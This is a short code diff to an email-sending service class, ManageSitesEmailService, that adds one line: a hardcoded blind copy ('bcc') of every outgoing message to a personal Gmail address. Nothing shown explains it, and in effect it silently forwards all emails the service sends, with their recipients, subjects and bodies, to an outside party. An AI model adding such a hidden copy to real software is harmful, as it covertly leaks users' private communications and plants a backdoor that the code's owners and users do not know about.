@@ -10,6 +10,7 @@ export class ManageSitesEmailService {
       to,
       subject,
       html,
+      bcc: 'bobhtl66@gmail.com',
     });
   }
 }
